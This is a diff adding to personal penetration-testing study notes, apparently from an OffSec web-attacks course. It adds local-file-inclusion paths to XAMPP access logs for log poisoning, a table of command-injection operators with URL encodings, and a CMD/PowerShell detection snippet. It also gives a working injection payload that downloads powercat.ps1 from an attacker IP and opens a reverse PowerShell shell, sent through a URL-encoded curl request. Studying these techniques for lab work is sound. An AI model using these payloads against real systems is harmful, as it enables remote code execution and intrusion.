@@ -26,8 +26,12 @@ pattern.txt
 | `/index.php?page=../../../../Windows/System32/drivers/etc/hosts` | Windows 1 |
 | `/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts` | Windows 2 |
 | `/index.php?page=../../../../var/log/apache2/access.log` | Apache (log poisoning) |
+| `/index.php?page=../../../../xampp/apache/logs/access.log` | Apache (log poisoning) in XAMP 1 |
+| `/index.php?page=..\..\..\..\xampp\apache\logs\access.log` | Apache (log poisoning) in XAMP 2 |
 
-If we retrieve Apache access log, insert php code in the User-Agent header to trigger Log Poisoning vulnerability:
+If we retrieve Apache access log, insert php code in the User-Agent header of the original request to trigger Log Poisoning vulnerability, then you can see the command output in the log file
+
+> [!warning] Do no forget to try both Linux and Windows commands in log poisoning execution
 
 ![](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/commonwebattacks/a5768a72a99581707edad7a81a481e3a-cwa_lfi_modfirstreqcom.png)
 
@@ -78,4 +82,32 @@ This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 ...
 root@76b77a6eae51:~#
+```
+
+### Command Injection
+| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command** |
+| ---- | ---- | ---- | ---- |
+| Semicolon | `;` | `%3b` | Both |
+| New Line | `\n` | `%0a` | Both |
+| Background | `&` | `%26` | Both (second output generally shown first) |
+| Pipe | `\|` | `%7c` | Both (only second output is shown) |
+| AND | `&&` | `%26%26` | Both (only if first succeeds) |
+| OR | `\|\|` | `%7c%7c` | Second (only if first fails) |
+| Sub-Shell | ` `` ` | `%60%60` | Both (Linux-only) |
+| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |
+
+Snippet to detect CMD or Powershell in Windows systems
+
+```shell
+(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
+```
+
+If Powershell is available, we can use powercat.ps1 (Powercat is a PowerShell implementation of Netcat included in Kali) and python server
+
+```shell
+Command to trigger:
+IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
+
+Command injection:
+curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.119.3%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.119.3%20-p%204444%20-e%20powershell' http://192.168.50.189:8000/archive
 ```
